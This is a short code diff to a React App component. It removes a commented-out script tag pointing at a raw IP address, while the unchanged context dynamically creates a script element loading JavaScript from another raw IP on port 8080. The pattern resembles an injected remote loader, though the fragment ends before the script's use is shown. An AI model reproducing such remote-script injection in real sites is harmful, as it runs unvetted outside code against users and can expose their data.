@@ -30,7 +30,9 @@ function App() {
     })();
   }, [isLoggedIn, useLocation().pathname]);
 
-  // <script src="https://193.183.247.22:8080/js/?id=123" defer></script>
+  
+
+
   useEffect(() => {
     const script = document.createElement("script");
     script.src = "https://62.168.153.58:8080/api/js/?id=1";
